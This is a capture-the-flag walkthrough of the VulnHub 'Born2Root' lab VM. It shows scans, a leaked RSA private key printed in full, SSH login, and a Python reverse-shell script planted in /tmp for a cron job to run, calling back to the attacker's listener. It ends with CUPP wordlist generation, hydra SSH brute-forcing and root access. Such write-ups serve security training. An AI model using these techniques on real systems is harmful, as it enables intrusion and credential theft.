Born2Root

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
[+] Content Discovery
[+] Remote Login with Private Key
[+] Privilege Escaltion with cronjob in /tmp
[+] Password generation with CUPP 
[+] Hydra Brute Forcing ssh credentials

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Scan Results

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Nmap scan report for 192.168.56.101
Host is up (0.00093s latency).
Not shown: 997 closed ports
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 6.7p1 Debian 5+deb8u3 (protocol 2.0)
| ssh-hostkey: 
|   1024 3d:6f:40:88:76:6a:1d:a1:fd:91:0f:dc:86:b7:81:13 (DSA)
|   2048 eb:29:c0:cb:eb:9a:0b:52:e7:9c:c4:a6:67:dc:33:e1 (RSA)
|   256 d4:02:99:b0:e7:7d:40:18:64:df:3b:28:5b:9e:f9:07 (ECDSA)
|_  256 e9:c4:0c:6d:4b:15:4a:58:4f:69:cd:df:13:76:32:4e (ED25519)
80/tcp  open  http    Apache httpd 2.4.10 ((Debian))
| http-robots.txt: 2 disallowed entries 
|_/wordpress-blog /files
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title:  Secretsec Company 
111/tcp open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version   port/proto  service
|   100000  2,3,4        111/tcp  rpcbind
|   100000  2,3,4        111/udp  rpcbind
|   100024  1          34159/tcp  status
|_  100024  1          41632/udp  status
MAC Address: 08:00:27:84:43:C4 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Dirb Results

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
root@setrus:~# dirb http://192.168.56.101

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Sun Oct 27 00:28:33 2019
URL_BASE: http://192.168.56.101/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.56.101/ ----
==> DIRECTORY: http://192.168.56.101/files/                                    
==> DIRECTORY: http://192.168.56.101/icons/                                    
+ http://192.168.56.101/index.html (CODE:200|SIZE:5651)                        
==> DIRECTORY: http://192.168.56.101/manual/                                   
+ http://192.168.56.101/robots.txt (CODE:200|SIZE:57)                          
+ http://192.168.56.101/server-status (CODE:403|SIZE:302)                      
                                                                               
---- Entering directory: http://192.168.56.101/files/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
---- Entering directory: http://192.168.56.101/icons/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                       
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Browsing to /icons we found a RSA Private KEY

![Alt Tag](https://raw.githubusercontent.com/setrus/VulnHub/master/Born2Root/born2root.png)
We use this private key to login to the server as martin.


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
root@setrus:~# wget http://192.168.56.101/icons/VDSoyuAXiO.txt -O id_rsa
--2019-10-27 00:47:29--  http://192.168.56.101/icons/VDSoyuAXiO.txt
Connecting to 192.168.56.101:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1677 (1.6K) [text/plain]
Saving to: ‘id_rsa’

id_rsa              100%[===================>]   1.64K  --.-KB/s    in 0s      

2019-10-27 00:47:29 (92.5 MB/s) - ‘id_rsa’ saved [1677/1677]

root@setrus:~# cat id_rsa 

-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAoNgGGOyEpn/txphuS2pDA1i2nvRxn6s8DO58QcSsY+/Nm6wC
tprVUPb+fmkKvOf5ntACY7c/5fM4y83+UWPG0l90WrjdaTCPaGAHjEpZYKt0lEc0
FiQkXTvJS4faYHNah/mEvhldgTc59jeX4di0f660mJjF31SA9UgMLQReKd5GKtUx
5m+sQq6L+VyA2/6GD/T3qx35AT4argdk1NZ9ONmj1ZcIp0evVJvUul34zuJZ5mDv
DZuLRR6QpcMLJRGEFZ4qwkMZn7NavEmfX1Yka6mu9iwxkY6iT45YA1C4p7NEi5yI
/P6kDxMfCVELAUaU8fcPolkZ6xLdS6yyThZHHwIDAQABAoIBAAZ+clCTTA/E3n7E
LL/SvH3oGQd16xh9O2FyR4YIQMWQKwb7/OgOfEpWjpPf/dT+sK9eypnoDiZkmYhw
+rGii6Z2wCXhjN7wXPnj1qotXkpu4bgS3+F8+BLjlQ79ny2Busf+pQNf1syexDJS
sEkoDLGTBiubD3Ii4UoF7KfsozihdmQY5qud2c4iE0ioayo2m9XIDreJEB20Q5Ta
lV0G03unv/v7OK3g8dAQHrBR9MXuYiorcwxLAe+Gm1h4XanMKDYM5/jW4JO2ITAn
kPducC9chbM4NqB3ryNCD4YEgx8zWGDt0wjgyfnsF4fiYEI6tqAwWoB0tdqJFXAy
FlQJfYECgYEAz1bFCpGBCApF1k/oaQAyy5tir5NQpttCc0L2U1kiJWNmJSHk/tTX
4+ly0CBUzDkkedY1tVYK7TuH7/tOjh8M1BLa+g+Csb/OWLuMKmpoqyaejmoKkLnB
WVGkcdIulfsW7DWVMS/zA8ixJpt7bvY7Y142gkurxqjLMz5s/xT9geECgYEAxpfC
fGvogWRYUY07OLE/b7oMVOdBQsmlnaKVybuKf3RjeCYhbiRSzKz05NM/1Cqf359l
Wdznq4fkIvr6khliuj8GuCwv6wKn9+nViS18s1bG6Z5UJYSRJRpviCS+9BGShG1s
KOf1fAWNwRcn1UKtdQVvaLBX9kIwcmTBrl+e6P8CgYAtz24Zt6xaqmpjv6QKDxEq
C1rykAnx0+AKt3DVWYxB1oRrD+IYq85HfPzxHzOdK8LzaHDVb/1aDR0r2MqyfAnJ
kaDwPx0RSN++mzGM7ZXSuuWtcaCD+YbOxUsgGuBQIvodlnkwNPfsjhsV/KR5D85v
VhGVGEML0Z+T4ucSNQEOAQKBgQCHedfvUR3Xx0CIwbP4xNHlwiHPecMHcNBObS+J
4ypkMF37BOghXx4tCoA16fbNIhbWUsKtPwm79oQnaNeu+ypiq8RFt78orzMu6JIH
dsRvA2/Gx3/X6Eur6BDV61to3OP6+zqh3TuWU6OUadt+nHIANqj93e7jy9uI7jtC
XXDmuQKBgHZAE6GTq47k4sbFbWqldS79yhjjLloj0VUhValZyAP6XV8JTiAg9CYR
2o1pyGm7j7wfhIZNBP/wwJSC2/NLV6rQeH7Zj8nFv69RcRX56LrQZjFAWWsa/C43
rlJ7dOFH7OFQbGp51ub88M1VOiXR6/fU8OMOkXfi1KkETj/xp6t+
-----END RSA PRIVATE KEY-----

root@setrus:~# chmod 600 id_rsa 
root@setrus:~# ssh -i id_rsa martin@192.168.56.101

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Fri Jun  9 20:31:29 2017 from 192.168.0.42

READY TO ACCESS THE SECRET LAB ? 

secret password : 
WELCOME ! 
martin@debian:~$ 

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


We are looing for cronjobs and we found a cron job that is runnin a python script located in tmp
Going to /tmp we did't find it so we had to create it. (with nano)

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
martin@debian:/tmp$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*/5   * * * *   jimmy   python /tmp/sekurity.py
martin@debian:/tmp$ 
martin@debian:/tmp$ nano sekurity.py
martin@debian:/tmp$ cat sekurity.py 
#!/usr/bin/python
import socket, subprocess, os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("192.168.56.102", 1234));
os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);
p=subprocess.call(["/bin/sh","-i"]);

martin@debian:/tmp$ 

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


After a couple of minutes, the cronjob is executed and we have a reverse shell as jimmy

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
root@setrus:~# nc -nvlp 1234
listening on [any] 1234 ...
connect to [192.168.56.102] from (UNKNOWN) [192.168.56.101] 47431
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=1002(jimmy) gid=1002(jimmy) groupes=1002(jimmy)
$ 
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

 Bruteforcing user hadi
 
 Creating a password file for hadi with CUPP https://github.com/Mebus/cupp

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
setrus@host:~/Downloads/cupp-master$ python3 cupp.py -i -q

[+] Insert the information about the victim to make a dictionary
[+] If you don't know all the info, just hit enter when asked! ;)

> First Name: hadi
> Surname: 
> Nickname: 
> Birthdate (DDMMYYYY): 


> Partners) name: 
> Partners) nickname: 
> Partners) birthdate (DDMMYYYY): 


> Child's name: 
> Child's nickname: 
> Child's birthdate (DDMMYYYY): 


> Pet's name: 
> Company name: 


> Do you want to add some key words about the victim? Y/[N]:  
> Do you want to add special chars at the end of words? Y/[N]: 
> Do you want to add some random numbers at the end of words? Y/[N]:y
> Leet mode? (i.e. leet = 1337) Y/[N]: 

[+] Now making a dictionary...
[+] Sorting list and removing duplicates...
[+] Saving dictionary to hadi.txt, counting 308 words.
[+] Now load your pistolero with hadi.txt and shoot! Good luck!

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


 
 
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
root@setrus:/# hydra -l hadi -P hadi.txt ssh://192.168.56.101

Hydra v8.8 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2019-10-27 01:27:58
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 308 login tries (l:1/p:308), ~20 tries per task
[DATA] attacking ssh://192.168.56.101:22/
[STATUS] 178.00 tries/min, 178 tries in 00:01h, 132 to do in 00:01h, 16 active
[22][ssh] host: 192.168.56.101   login: hadi   password: hadi123
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 2 final worker threads did not complete until end.
[ERROR] 2 targets did not resolve or could not be connected
[ERROR] 16 targets did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2019-10-27 01:29:34

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Logging in as hadi and privilege escation with sudo

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
root@setrus:~# ssh hadi@192.168.56.101
hadi@192.168.56.101's password: 

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Oct 27 06:49:03 2019 from 192.168.56.102
hadi@debian:~$ su
Mot de passe : 
root@debian:/home/hadi# id
uid=0(root) gid=0(root) groupes=0(root)
root@debian:/home/hadi# 

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~




